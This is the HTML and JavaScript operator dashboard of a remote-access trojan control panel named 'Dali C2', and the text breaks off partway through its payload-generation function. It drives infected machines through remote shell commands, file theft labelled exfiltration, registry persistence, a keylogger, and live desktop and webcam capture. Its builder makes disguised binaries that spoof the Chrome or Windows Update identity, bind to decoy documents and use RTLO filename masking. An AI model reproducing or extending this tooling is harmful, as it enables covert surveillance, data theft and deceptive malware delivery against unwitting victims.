<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Dali C2 ðŸ˜ˆ</title>
    <link rel="stylesheet" href="/static/style.css?v=1.3" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&family=JetBrains+Mono&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <div class="layout">
      <!-- Sidebar -->
      <div class="sidebar">
        <div class="logo">
          <svg
            width="28"
            height="28"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2.5"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <path d="M12 2a10 10 0 1 0 10 10H12V2z" />
            <path d="M12 12L2.7 7.3" />
            <path d="M12 12V22" />
            <path d="M12 12L21.3 7.3" />
          </svg>
          Dali <span>C2</span>
        </div>
        <div
          style="
            font-size: 0.7rem;
            color: var(--text-muted);
            margin-bottom: 1rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            font-weight: 700;
          "
        >
          Inventory Nodes
        </div>
        <div id="agent-list">
          <p style="color: var(--text-muted)">Scanning fleet...</p>
        </div>

        <div
          style="
            font-size: 0.7rem;
            color: var(--text-muted);
            margin: 2rem 0 1rem 0;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            font-weight: 700;
          "
        >
          Orchestration Tools
        </div>
        <div style="display: flex; flex-direction: column; gap: 8px">
          <button
            class="sidebar-tool-btn"
            style="
              width: 100%;
              text-align: left;
              justify-content: flex-start;
              gap: 12px;
              background: rgba(56, 189, 248, 0.05);
              border-color: rgba(56, 189, 248, 0.1);
            "
            onclick="openBuilder()"
          >
            <svg
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <path d="m5 14 7-7 7 7" />
              <path d="M12 7v14" />
            </svg>
            Payload Builder
          </button>
        </div>
      </div>

      <!-- Main Area -->
      <div class="main-content">
        <!-- Stats Bar -->
        <div class="stats-container">
          <div class="stat-card">
            <span class="stat-label">Active Fleet</span>
            <span class="stat-value" id="stat-online">0</span>
          </div>
          <div class="stat-card">
            <span class="stat-label">Total Jobs</span>
            <span class="stat-value" id="stat-tasks">0</span>
          </div>
          <div class="stat-card">
            <span class="stat-label">Queue Load</span>
            <span class="stat-value" id="stat-pending">0</span>
          </div>
          <div class="stat-card">
            <span class="stat-label">Control Plane</span>
            <div style="display: flex; gap: 8px; margin-top: 10px">
              <button
                style="padding: 6px 12px; font-size: 0.65rem"
                onclick="exportAudit()"
              >
                Export Audit
              </button>
              <a
                href="/docs"
                target="_blank"
                style="
                  padding: 6px 12px;
                  font-size: 0.65rem;
                  background: rgba(255, 255, 255, 0.05);
                  color: var(--text-main);
                  border-radius: 1rem;
                  text-decoration: none;
                  border: 1px solid rgba(255, 255, 255, 0.1);
                  font-weight: 700;
                  display: flex;
                  align-items: center;
                "
                >API</a
              >
            </div>
          </div>
        </div>

        <div id="welcome-screen" class="glass-card">
          <h1>Dali Orchestrator</h1>
          <p
            style="
              color: var(--text-muted);
              font-size: 1.1rem;
              max-width: 600px;
            "
          >
            The central nervous system for your fleet. Select a managed node to
            begin high-concurrency job orchestration and sensor telemetry
            analysis.
          </p>
        </div>

        <!-- Orchestrator Controls -->
        <div id="agent-controls" class="glass-card" style="display: none">
          <div
            style="
              display: flex;
              justify-content: space-between;
              align-items: flex-start;
              margin-bottom: 1.5rem;
            "
          >
            <div>
              <h2
                id="active-agent-title"
                style="font-size: 1.75rem; margin-bottom: 0.25rem"
              >
                Node ID
              </h2>
              <div id="node-tags" style="display: flex; gap: 10px"></div>
            </div>
            <div style="display: flex; gap: 10px">
                <button class="btn-accent" style="background: rgba(139, 92, 246, 0.1); color: #a78bfa;" onclick="openStream('desktop')">Desktop Stream</button>
                <button class="btn-accent" style="background: rgba(236, 72, 153, 0.1); color: #f472b6;" onclick="openStream('camera')">Camera Stream</button>
                <button class="btn-accent" style="background: rgba(34, 197, 94, 0.1); color: var(--success);" onclick="openTerminal()">Live Terminal</button>
                <button class="btn-accent" onclick="openKeylogger()">HID Intercept</button>
                <button class="btn-danger" onclick="deleteCurrentNode()">Terminate Node</button>
            </div>
          </div>

          <div class="task-controls">
            <select id="task-type" onchange="updatePlaceholder()">
              <option value="sysinfo">Telemetry Analysis (Sysinfo)</option>
              <option value="shell">Shell Orchestration (cmd / c)</option>
              <option value="exec">Direct Binary Execution (Exec)</option>
              <option value="upload">Deploy Artifact (Upload)</option>
              <option value="download">Exfiltrate Telemetry (Download)</option>
              <option value="persist">Persistence Vector (Registry)</option>
            </select>
            <input type="text" id="task-command" placeholder="Enter configuration payload..." style="flex-grow: 1" />
            <button id="browse-btn" style="background: rgba(255,255,255,0.05); color: white; display: none;" onclick="document.getElementById('file-input').click()">Browse...</button>
            <input type="file" id="file-input" style="display: none" onchange="onFileSelected()">
            <button onclick="sendTask()">Execute Job</button>
          </div>
        </div>

        <!-- Job History -->
        <div id="terminal-container" style="display: none">
          <div class="glass-card">
            <h2
              style="
                margin-bottom: 2rem;
                display: flex;
                align-items: center;
                gap: 10px;
              "
            >
              <svg
                width="20"
                height="20"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
              </svg>
              Orchestration Log
            </h2>
            <table class="job-table">
              <thead>
                <tr>
                  <th>Ref</th>
                  <th>Vector</th>
                  <th>Timestamp</th>
                  <th>Status</th>
                  <th>Outcome</th>
                </tr>
              </thead>
              <tbody id="task-history"></tbody>
            </table>
          </div>
        </div>

    <!-- Payload Builder Modal -->
    <div id="builder-modal-backdrop" class="modal-backdrop">
        <div class="modal glass-card" style="max-width: 700px; padding: 2.5rem;">
            <div class="modal-header" style="margin-bottom: 2rem;">
                <div style="display: flex; align-items: center; gap: 15px;">
                    <div class="builder-icon-wrapper" style="margin-bottom: 0;">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 14 4-4 4 4"/><path d="M16 10v11"/><path d="M12 22h8"/><path d="M12 2H5a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4"/></svg>
                    </div>
                    <div>
                        <h2 style="margin: 0; font-size: 1.6rem; letter-spacing: -0.01em;">Orchestration Builder <span>Pro</span></h2>
                        <p style="margin: 0; font-size: 0.8rem; color: var(--text-muted);">Configure and compile high-concurrency node binaries.</p>
                    </div>
                </div>
                <button class="btn-secondary" style="background: rgba(255,255,255,0.05); border: none;" onclick="closeBuilder()">Discard</button>
            </div>
            
            <div id="builder-form">
                <!-- Status Panel -->
                <div class="build-box" style="background: rgba(56, 189, 248, 0.03); border-color: rgba(56, 189, 248, 0.1);">
                    <div style="display: flex; justify-content: space-between; align-items: flex-start;">
                        <div>
                            <div id="build-status-pill" class="status-pill">Ready for Deployment</div>
                            <div id="build-status-text" style="font-size: 0.85rem; color: var(--text-main); font-weight: 500; margin-top: 5px;">
                                Finalizing compiler environment. No tasks in queue.
                            </div>
                        </div>
                        <div style="text-align: right;">
                            <span class="micro-label">Compiler Version</span>
                            <div style="font-size: 0.70rem; font-family: 'JetBrains Mono'; color: var(--accent);">Dali-B1.2.0</div>
                        </div>
                    </div>
                    <div id="build-progress-container" class="progress-bar-container">
                        <div id="build-progress-fill" class="progress-bar-fill"></div>
                    </div>
                </div>

                <!-- Section 1: Core -->
                <div class="config-section">
                    <span class="micro-label">01 // Core Configuration</span>
                    <div class="builder-grid">
                        <div class="form-group" style="margin-bottom: 0;">
                            <label>Callback Endpoint</label>
                            <input type="text" id="build-url" placeholder="http://10.0.0.1:8000">
                        </div>
                        <div class="form-group" style="margin-bottom: 0;">
                            <label>AES Tunnel Key</label>
                            <input type="text" id="build-key" maxlength="16" placeholder="DaliSecureC2Key_">
                        </div>
                    </div>
                </div>

                <!-- Section 2: Identity -->
                <div class="config-section">
                    <span class="micro-label">02 // Transport Identity Profile</span>
                    <div class="form-group" style="margin-top: 10px; margin-bottom: 0;">
                        <select id="build-identity">
                            <option value="agent">Dali Standard Agent (Explicit Signature)</option>
                            <option value="browser" selected>Google Chrome Signature (Stealth Profile)</option>
                            <option value="updater">Windows Update Agent (Persistent Signature)</option>
                            <option value="legit_service">Microsoft Background Intelligent Service</option>
                        </select>
                    </div>
                </div>

                <!-- Section 3: Masking -->
                <div class="config-section">
                    <span class="micro-label">03 // Payload Masking (Joiner)</span>
                    <div class="builder-grid" style="align-items: end;">
                            <label>Decoy Document & Icon Spoofing</label>
                            <div style="position: relative;">
                                <input type="file" id="build-decoy" style="display: none;" onchange="updateFileName(this)">
                                <button class="btn-secondary" style="width: 100%; justify-content: flex-start; gap: 10px; background: rgba(255,255,255,0.03);" onclick="document.getElementById('build-decoy').click()">
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                                    <span id="decoy-file-name" style="font-size: 0.8rem;">Select PDF, Image, JSON, etc...</span>
                                </button>
                                <div style="font-size: 0.6rem; color: var(--accent); margin-top: 5px; opacity: 0.8;">
                                    âœ¨ Auto-Icon adjustment applied for image decoys.
                                </div>
                            </div>
                        <div style="background: rgba(255,255,255,0.01); padding: 0.85rem; border-radius: 0.85rem; border: 1px solid rgba(255,255,255,0.05); height: 45px; display: flex; align-items: center; justify-content: space-between;">
                             <div>
                                <span style="font-size: 0.75rem; font-weight: 700;">RTLO Masking</span>
                                <div style="font-size: 0.55rem; color: var(--text-muted);">Hides .exe suffix visually.</div>
                             </div>
                             <div id="rtlo-toggle" class="toggle-switch" onclick="toggleRTLO()">
                                <div class="toggle-knob"></div>
                             </div>
                             <input type="checkbox" id="build-rtlo" style="display: none;">
                        </div>
                    </div>
                </div>

                <div style="display: flex; gap: 15px;">
                    <button id="build-submit-btn" class="btn-accent" style="flex: 1; padding: 1.25rem; border-radius: 1.25rem; font-size: 1.05rem; box-shadow: 0 10px 30px rgba(56, 189, 248, 0.2); transition: var(--transition);" onclick="generatePayload()">
                        <div style="display: flex; align-items: center; justify-content: center; gap: 12px;">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="7.5 4.21 12 6.81 16.5 4.21"/><polyline points="7.5 19.79 7.5 14.63 3 12"/><polyline points="21 12 16.5 14.63 16.5 19.79"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>
                            Generate Secure Binary
                        </div>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Keylogger Modal -->
    <div id="keylogger-modal-backdrop" class="modal-backdrop">
        <div class="modal glass-card">
            <div class="modal-header">
                <h2 style="display: flex; align-items: center; gap: 10px;">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 9v11a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V9"/><path d="M9 22V12h6v10"/><path d="M2 10.6L12 2l10 8.6"/></svg>
                    HID Intercept
                </h2>
                <button class="btn-secondary" style="padding: 5px 10px;" onclick="closeKeylogger()">Close</button>
            </div>
            <div id="kl-log" class="kl-log-area">[*] Listener inactive...</div>
            <div class="kl-controls">
                <button id="kl-start" class="btn-accent" onclick="startKL()">Deploy Listener</button>
                <button id="kl-stop" class="btn-danger" style="display: none;" onclick="stopKL()">Terminate Listener</button>
            </div>
        </div>
    </div>

    <!-- Terminal Modal -->
    <div id="term-modal-backdrop" class="modal-backdrop">
        <div class="modal glass-card" style="max-width: 800px; padding: 0;">
            <div class="modal-header" style="padding: 1.5rem 1.5rem 0 1.5rem;">
                <h2 style="display: flex; align-items: center; gap: 10px;">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
                    Live Terminal Console
                </h2>
                <button class="btn-secondary" style="padding: 5px 10px;" onclick="closeTerminal()">Close</button>
            </div>
            <div class="console-wrapper" style="border: none; border-radius: 0; height: 550px;">
                <div id="console-output" class="console-output">
                    <div style="color: grey;">[*] Terminal initialized. Ready for commands.</div>
                </div>
                <div class="console-input-area">
                    <span class="console-prompt">></span>
                    <input type="text" id="console-input" class="console-input" autofocus placeholder="Type a command..." onkeydown="handleConsoleInput(event)">
                </div>
            </div>
        </div>
    </div>

    <!-- Stream Modal -->
    <div id="stream-modal-backdrop" class="modal-backdrop">
        <div class="modal glass-card" style="max-width: 1000px; padding: 0;">
            <div class="modal-header" style="padding: 1.5rem;">
                <h2 id="stream-title" style="display: flex; align-items: center; gap: 10px;">Stream</h2>
                <button class="btn-secondary" style="padding: 5px 10px;" onclick="closeStream()">Close</button>
            </div>
            <div style="background: #000; border-radius: 0 0 1.5rem 1.5rem; overflow: hidden; display: flex; justify-content: center; min-height: 400px; position: relative;">
                <div id="stream-loading" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: var(--accent);">Synchronizing Stream...</div>
                <img id="stream-img" src="" style="width: 100%; height: auto; display: none;">
            </div>
        </div>
    </div>

    <script>
      let activeAgentId = null;
      let selectedFileData = null;
      const accessToken = localStorage.getItem("access_token");

      if (!accessToken) {
        window.location.href = "/login";
      }

      async function apiFetch(url, options = {}) {
        options.headers = {
          ...options.headers,
          Authorization: `Bearer ${accessToken}`,
          "Content-Type": "application/json",
        };
        const response = await fetch(url, options);
        if (response.status === 401) {
          localStorage.removeItem("access_token");
          window.location.href = "/login";
        }
        return response;
      }

      async function fetchStats() {
        try {
          const res = await apiFetch("/api/stats");
          const stats = await res.json();
          document.getElementById("stat-online").innerText =
            stats.online_agents;
          document.getElementById("stat-tasks").innerText = stats.total_tasks;
          document.getElementById("stat-pending").innerText =
            stats.pending_tasks;
        } catch (e) {}
      }

      async function fetchAgents() {
        try {
          const res = await apiFetch("/api/agents");
          const agents = await res.json();
          const list = document.getElementById("agent-list");
          list.innerHTML = "";

          agents.forEach((agent) => {
            const div = document.createElement("div");
            div.className = `agent-item ${
              agent.id === activeAgentId ? "active" : ""
            }`;
            div.onclick = () => selectAgent(agent);
            const isOnline = agent.status === "online";
            const displayName = agent.info?.user || agent.id.substring(0, 8);
            const displayIp = agent.info?.ip || "0.0.0.0";
            div.innerHTML = `
                <div class="agent-id">Node::${displayName}</div>
                <div class="agent-status" style="color: ${
                  isOnline ? "var(--success)" : "var(--text-muted)"
                }">
                    <span class="status-dot ${
                      isOnline ? "status-online" : "status-offline"
                    }"></span>
                    ${agent.status.toUpperCase()}
                </div>
                <div class="agent-meta">
                    <span style="color: var(--accent); font-weight: 600;">IP: ${displayIp}</span>
                    <span>OS: ${agent.info?.os || "---"}</span>
                </div>
            `;
            list.appendChild(div);
          });
        } catch (e) {}
      }

      let commandHistory = [];
      let historyIndex = -1;

      function openTerminal() {
          if (!activeAgentId) return;
          document.getElementById('term-modal-backdrop').style.display = 'flex';
          document.getElementById('console-input').focus();
      }

      function closeTerminal() {
          document.getElementById('term-modal-backdrop').style.display = 'none';
      }

      function selectAgent(agent) {
        activeAgentId = agent.id;
        document.getElementById("welcome-screen").style.display = "none";
        document.getElementById("agent-controls").style.display = "block";
        document.getElementById("terminal-container").style.display = "block";
        
        const displayName = agent.info?.user || agent.id.substring(0, 8);
        const displayIp = agent.info?.ip || '0.0.0.0';
        document.getElementById("active-agent-title").innerText = `Managed Node [${displayName} @ ${displayIp}]`;
        
        const tags = document.getElementById("node-tags");
        tags.innerHTML = `
            <span class="badge" style="background: rgba(255,255,255,0.05)">${agent.info?.user || 'Unknown'}</span>
            <span class="badge" style="background: rgba(56,189,248,0.1); color: var(--accent)">${displayIp}</span>
            <span class="badge" style="background: rgba(34, 197, 94, 0.1); color: var(--success)">${agent.info?.os || 'OS'}</span>
        `;

        fetchAgents();
        fetchHistory();
      }

      function openKeylogger() {
          if (!activeAgentId) return;
          document.getElementById('keylogger-modal-backdrop').style.display = 'flex';
          startKLPolling();
      }

      function closeKeylogger() {
          document.getElementById('keylogger-modal-backdrop').style.display = 'none';
          if (klInterval) clearInterval(klInterval);
      }

      function handleConsoleInput(event) {
        const input = event.target;
        if (event.key === "Enter") {
          const cmd = input.value.trim();
          if (cmd) {
            commandHistory.push(cmd);
            historyIndex = commandHistory.length;
            appendToConsole(
              `<span style="color: var(--accent)">> ${cmd}</span>`
            );
            sendTaskToNode("shell", cmd);
            input.value = "";
          }
        } else if (event.key === "ArrowUp") {
          if (historyIndex > 0) {
            historyIndex--;
            input.value = commandHistory[historyIndex];
          }
        } else if (event.key === "ArrowDown") {
          if (historyIndex < commandHistory.length - 1) {
            historyIndex++;
            input.value = commandHistory[historyIndex];
          } else {
            historyIndex = commandHistory.length;
            input.value = "";
          }
        }
      }

      function appendToConsole(html) {
        const out = document.getElementById("console-output");
        const div = document.createElement("div");
        div.innerHTML = html;
        out.appendChild(div);
        out.scrollTop = out.scrollHeight;
      }

      async function sendTaskToNode(type, cmd) {
        if (!activeAgentId) return;
        try {
          await apiFetch(`/operator/tasks`, {
            method: "POST",
            body: JSON.stringify({
              agent_id: activeAgentId,
              task_type: type,
              command: cmd,
            }),
          });
        } catch (e) {
          appendToConsole(
            `<span style="color: var(--danger)">[!] Failed to send task</span>`
          );
        }
      }

      async function deleteCurrentNode() {
        if (!activeAgentId) return;
        if (
          !confirm(
            `Are you sure you want to terminate Node ${activeAgentId.substring(
              0,
              8
            )}? This will remove all associated logs.`
          )
        )
          return;

        try {
          const res = await apiFetch(`/api/agents/${activeAgentId}`, {
            method: "DELETE",
          });
          if (res.ok) {
            activeAgentId = null;
            document.getElementById("agent-controls").style.display = "none";
            document.getElementById("terminal-container").style.display =
              "none";
            document.getElementById("welcome-screen").style.display = "flex";
            fetchAgents();
            fetchStats();
          }
        } catch (e) {
          alert("Termination failed");
        }
      }

      async function fetchHistory() {
        if (!activeAgentId) return;
        try {
          const res = await apiFetch(`/api/tasks/${activeAgentId}`);
          const tasks = await res.json();
          const container = document.getElementById("task-history");
          container.innerHTML = "";

          tasks.forEach((task) => {
            const row = document.createElement("tr");
            let outcome = `<i style="color: var(--text-muted)">Awaiting execution...</i>`;

            if (task.status === "leased") {
              outcome = `<span style="color: var(--accent)">Node processing...</span>`;
            } else if (task.status === "failed") {
              outcome = `<div class="result-block" style="border-color: var(--danger)">${
                task.result?.error || "Execution Error"
              }</div>`;
            } else if (
              task.status === "completed" &&
              task.type === "download" &&
              task.result?.content
            ) {
              const filename = task.result.filename || "downloaded_file";
              outcome = `
                    <div style="display: flex; align-items: center; gap: 10px;">
                        <span style="color: var(--success)">File ready (${(
                          task.result.size / 1024
                        ).toFixed(1)} KB)</span>
                        <button onclick="downloadBlob('${
                          task.result.content
                        }', '${filename}')" style="padding: 4px 10px; font-size: 0.7rem;">Save File</button>
                    </div>
                `;
            } else if (
              task.status === "completed" &&
              task.type === "keylogger" &&
              task.result?.log
            ) {
              outcome = `
                    <div style="color: #fbbf24; font-weight: 700; margin-bottom: 5px;">HID Exfiltration Data:</div>
                    <div class="result-block" style="white-space: pre-wrap; color: #fcd34d;">${task.result.log}</div>
                `;
            } else if (task.status === "completed" && (task.type === "screenshot" || task.type === "camera") && task.result?.content) {
                const mime = task.type === 'screenshot' ? 'image/png' : 'image/jpeg';
                outcome = `
                    <div style="color: var(--accent); font-weight: 700; margin-bottom: 5px;">Visual Exfiltration [${task.type.toUpperCase()}]:</div>
                    <img src="data:${mime};base64,${task.result.content}" style="max-width: 200px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1); cursor: zoom-in;" onclick="window.open(this.src)">
                `;
            } else if (task.result) {
              const out =
                task.result.stdout ||
                JSON.stringify(task.result.info || task.result, null, 2);
              outcome = `<div class="result-block">${out}</div>`;
            }

            row.innerHTML = `
                <td><code style="color: var(--accent)">#${task.id.substring(
                  0,
                  4
                )}</code></td>
                <td><b style="font-size: 0.75rem">${task.type.toUpperCase()}</b></td>
                <td style="font-size: 0.75rem; color: var(--text-muted)">${new Date(
                  task.created_at
                ).toLocaleTimeString()}</td>
                <td><span class="badge badge-${task.status}">${
              task.status
            }</span></td>
                <td>${outcome}</td>
            `;
            container.appendChild(row);
          });
        } catch (e) {}
      }

      function downloadBlob(base64, filename) {
        const link = document.createElement("a");
        link.href = "data:application/octet-stream;base64," + base64;
        link.download = filename;
        link.click();
      }

      function updatePlaceholder() {
        const type = document.getElementById("task-type").value;
        const input = document.getElementById("task-command");
        const browseBtn = document.getElementById("browse-btn");

        browseBtn.style.display = type === "upload" ? "inline-block" : "none";

        const mapping = {
          sysinfo: "Telemetry analysis (no input required)...",
          shell: "System command (e.g. whoami or net user)...",
          exec: "Direct binary path (e.g. C:\\Windows\\System32\\calc.exe)...",
          upload: "Destination folder (e.g. C:\\Windows\\temp\\)...",
          download:
            "Remote file path to exfiltrate (e.g. C:\\Users\\Public\\secret.txt)...",
          persist: "Registry key name for persistence (optional)...",
          keylogger: "Action (start/stop/dump) and optional duration...",
        };
        input.placeholder = mapping[type] || "Enter configuration payload...";
      }

      function onFileSelected() {
        const file = document.getElementById("file-input").files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = function (e) {
          selectedFileData = {
            filename: file.name,
            content: e.target.result.split(",")[1],
            size: file.size,
          };
          document.getElementById("task-command").value =
            "Ready to upload: " + file.name;
        };
        reader.readAsDataURL(file);
      }

      async function sendTask() {
        const type = document.getElementById("task-type").value;
        const command = document.getElementById("task-command").value;
        if (!activeAgentId) return;

        let taskReq = {
          agent_id: activeAgentId,
          task_type: type,
        };

        if (type === "keylogger") {
          const parts = command.split(" ");
          taskReq.payload = {
            action: parts[0] || "start",
            duration: parseInt(parts[1]) || 30,
          };
        } else if (type === "upload" && selectedFileData) {
          let destPath = command
            .replace("Ready to upload: " + selectedFileData.filename, "")
            .trim();
          if (!destPath) destPath = "C:\\Windows\\Temp\\";
          taskReq.payload = {
            filename: selectedFileData.filename,
            content: selectedFileData.content,
            path: destPath,
          };
          selectedFileData = null;
          document.getElementById("file-input").value = "";
        } else {
          taskReq.command = command;
        }

        try {
          await apiFetch(`/operator/tasks`, {
            method: "POST",
            body: JSON.stringify(taskReq),
          });
          document.getElementById("task-command").value = "";
          fetchHistory();
        } catch (e) {
          alert("Execution failed");
        }
      }

      async function exportAudit() {
        try {
          const res = await apiFetch("/api/tasks/export");
          const blob = await res.blob();
          const url = window.URL.createObjectURL(blob);
          const a = document.createElement("a");
          a.href = url;
          a.download = "fleet_audit_log.csv";
          document.body.appendChild(a);
          a.click();
          a.remove();
        } catch (e) {
          alert("Export failed");
        }
      }

      function connectWebSocket() {
        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
        const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
        ws.onmessage = (event) => {
          const data = JSON.parse(event.data);
          fetchAgents();
          fetchStats();
          if (
            activeAgentId &&
            (data.agent_id === activeAgentId || data.event === "agent_deleted")
          ) {
            if (
              data.event === "agent_deleted" &&
              data.agent_id === activeAgentId
            ) {
              activeAgentId = null;
              location.reload();
            } else if (data.event === "task_updated") {
              fetchHistory();
              // For console mode, if the updated task is a shell task, we can show it in console
              // But we need to fetch the result. We'll let fetchHistory handle UI, but maybe fetch latest console line?
              checkLatestConsoleResult();
            }
          }
        };
        ws.onclose = () => setTimeout(connectWebSocket, 5000);
      }

      async function checkLatestConsoleResult() {
        const res = await apiFetch(`/api/tasks/${activeAgentId}`);
        const tasks = await res.json();
        const lastShell = tasks.find(
          (t) => t.type === "shell" && t.status === "completed"
        );
        if (lastShell && lastShell.result && !lastShell._shown_in_console) {
          const out = lastShell.result.stdout || lastShell.result.error || "";
          appendToConsole(out.replace(/\n/g, "<br>"));
          lastShell._shown_in_console = true; // Temporary flag
        }
      }

      let klInterval = null;

      function openKeylogger() {
          if (!activeAgentId) return;
          document.getElementById('kl-modal-backdrop').style.display = 'flex';
          startKLPolling();
      }

      function closeKeylogger() {
          document.getElementById('kl-modal-backdrop').style.display = 'none';
          if (klInterval) clearInterval(klInterval);
      }

      async function startKL() {
          await apiFetch(`/operator/tasks`, { 
              method: "POST", 
              body: JSON.stringify({ agent_id: activeAgentId, task_type: 'keylogger', payload: { action: 'start', duration: 0 } }) 
          });
          document.getElementById('kl-start').style.display = 'none';
          document.getElementById('kl-stop').style.display = 'inline-block';
          document.getElementById('kl-log').innerHTML += `<div style="color: grey;">[*] Listener deployed. Streaming HID data...</div>`;
      }

      async function stopKL() {
          await apiFetch(`/operator/tasks`, { 
              method: "POST", 
              body: JSON.stringify({ agent_id: activeAgentId, task_type: 'keylogger', payload: { action: 'stop' } }) 
          });
          document.getElementById('kl-start').style.display = 'inline-block';
          document.getElementById('kl-stop').style.display = 'none';
          document.getElementById('kl-log').innerHTML += `<div style="color: grey;">[*] Listener terminated.</div>`;
      }

      function startKLPolling() {
          if (klInterval) clearInterval(klInterval);
          klInterval = setInterval(async () => {
              if (!activeAgentId) return;
              // Send a dump request
              await apiFetch(`/operator/tasks`, { 
                  method: "POST", 
                  body: JSON.stringify({ agent_id: activeAgentId, task_type: 'keylogger', payload: { action: 'dump' } }) 
              });
              
              // Find the latest dump result in history
              const res = await apiFetch(`/api/tasks/${activeAgentId}`);
              const tasks = await res.json();
              const latestDump = tasks.find(t => t.type === 'keylogger' && t.status === 'completed' && t.result?.log);
              if (latestDump && latestDump.result.log && !latestDump._shown_in_kl) {
                  const area = document.getElementById('kl-log');
                  area.innerText += latestDump.result.log;
                  area.scrollTop = area.scrollHeight;
                  latestDump._shown_in_kl = true;
              }
          }, 3000);
      }

      let streamInterval = null;
      let currentStreamType = null;

      function openStream(type) {
          if (!activeAgentId) return;
          currentStreamType = type;
          document.getElementById('stream-modal-backdrop').style.display = 'flex';
          document.getElementById('stream-title').innerText = type === 'desktop' ? 'Desktop Live Stream' : 'Webcam Live Stream';
          document.getElementById('stream-img').style.display = 'none';
          document.getElementById('stream-loading').style.display = 'block';
          startStreamPolling();
      }

      function closeStream() {
          document.getElementById('stream-modal-backdrop').style.display = 'none';
          if (streamInterval) clearInterval(streamInterval);
          currentStreamType = null;
      }

      function startStreamPolling() {
          if (streamInterval) clearInterval(streamInterval);
          streamInterval = setInterval(async () => {
              if (!activeAgentId || !currentStreamType) return;
              
              const taskType = currentStreamType === 'desktop' ? 'screenshot' : 'camera';
              
              // Trigger a new capture
              await apiFetch(`/operator/tasks`, { 
                  method: "POST", 
                  body: JSON.stringify({ agent_id: activeAgentId, task_type: taskType }) 
              });

              // Fetch latest capture in history
              const res = await apiFetch(`/api/tasks/${activeAgentId}`);
              const tasks = await res.json();
              const latest = tasks.find(t => t.type === taskType && t.status === 'completed' && t.result?.content);
              
              if (latest && latest.result.content) {
                  const img = document.getElementById('stream-img');
                  const loading = document.getElementById('stream-loading');
                  const mime = latest.result.format === 'png' ? 'image/png' : 'image/jpeg';
                  
                  img.src = `data:${mime};base64,${latest.result.content}`;
                  img.style.display = 'block';
                  loading.style.display = 'none';
              }
          }, 2000); // 2 second refresh for desktop/camera
      }

      function updateFileName(input) {
          const nameSpan = document.getElementById('decoy-file-name');
          if (input.files && input.files[0]) {
              nameSpan.innerText = input.files[0].name;
              nameSpan.style.color = 'var(--accent)';
          } else {
              nameSpan.innerText = "Select Image, PDF, or DOC...";
              nameSpan.style.color = 'var(--text-muted)';
          }
      }

      function toggleRTLO() {
          const toggle = document.getElementById('rtlo-toggle');
          const checkbox = document.getElementById('build-rtlo');
          checkbox.checked = !checkbox.checked;
          if (checkbox.checked) {
              toggle.classList.add('active');
          } else {
              toggle.classList.remove('active');
          }
      }

      function openBuilder() {
          document.getElementById('builder-modal-backdrop').style.display = 'flex';
          // Pre-fill URL if possible
          document.getElementById('build-url').value = window.location.origin;
          document.getElementById('build-key').value = "DaliSecureC2Key_"; // Default
          // Reset RTLO
          document.getElementById('build-rtlo').checked = false;
          document.getElementById('rtlo-toggle').classList.remove('active');
      }

      function closeBuilder() {
          document.getElementById('builder-modal-backdrop').style.display = 'none';
      }

      async function generatePayload() {
          const url = document.getElementById('build-url').value;
          const key = document.getElementById('build-key').value;
          const identity = document.getElementById('build-identity').value;
          const decoyFile = document.getElementById('build-decoy').files[0];
          const rtlo = document.getElementById('build-rtlo').checked;
          
          const statusText = document.getElementById('build-status-text');
          const statusPill = document.getElementById('build-status-pill');
          const progressContainer = document.getElementById('build-progress-container');
          const progressFill = document.getElementById('build-progress-fill');
          const btn = document.getElementById('build-submit-btn');

          if (!url || !key) {
              alert("Configuration incomplete. Please provide C2 URL and Tunnel Key.");
              return;
          }

          // UI Transition: Building
          btn.disabled = true;
          btn.style.opacity = '0.5';
          statusPill.innerText = "Compiling";
          statusPill.classList.add('building-pulse');
          statusText.innerText = "Generating high-performance node binary. This may take up to 60s...";
          progressContainer.style.display = 'block';
          
          // Faux Progress Animation
          let prog = 0;
          const progInterval = setInterval(() => {
